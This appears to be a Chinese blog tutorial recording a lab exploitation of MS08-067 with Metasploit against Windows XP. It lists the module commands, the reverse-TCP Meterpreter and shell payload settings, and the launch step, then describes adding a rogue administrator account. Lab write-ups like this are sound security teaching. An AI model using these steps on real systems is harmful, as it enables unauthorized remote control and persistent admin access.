MS08-067在kali下的姿态

发表于 2018-03-29
一个远古漏洞利用实验

导语：MS08-067漏洞是微软在2008/10/22公布的一个漏洞。这个漏洞在那时会影响除Windows Server 2008 Core以外的所有Windows系统。

实验正文：

实验器材：kali，win xp sp3英文版
实验目的：获取目标机shell以及进行一些操作

实验记录：


1.winxp通过ipconfig获取IP
kali则在终端通过ifconfig获取本机IP（注意是if）


2.打开msfconsole（今天的标志超帅(≖ᴗ≖)✧）（ps：Msfconsole是一个一体化的集中控制台。很强大！）



3.输入命令search ms08_067,查找漏洞
并且通过use命令使用漏洞模块


4.set payload/windows/meterpreter/reverse_tcp
或set payload generic/shell_reverse_tcp
设置攻击有效载荷（可以理解成选择武器）
（1）第一种是进入meterpreter，这是个很强大的工具，键入“?”即可查看功能，在此就不一一列举了（上图用的第一种）
（2）第二种会得到命令行的一个shell。


5.set LHOST “kali的IP”
set RHOST “winxp的IP”
设置LHOST（kali的IP）和RHOST（win的IP）


6.重头戏：键入exploit，发起进攻！
（全军出击(((ꎤ’ω’)و三 ꎤ’ω’)-o≡）
—攻击成功—，现在可以为所欲为了，哈哈哈



上图所示的是meterpreter的截屏功能，是不是很强大✧(≖ ◡ ≖✿


7.回过头来，看看第二种攻击有效载荷，攻击成功后是cmd命令行。上图是我向目标机建立了一个名为hacker的账户，并添加进了管理员组（命令百度一下啦，很简单的<(￣ ﹌ ￣)> ）


登上winxp，果不其然，多出来一个账户
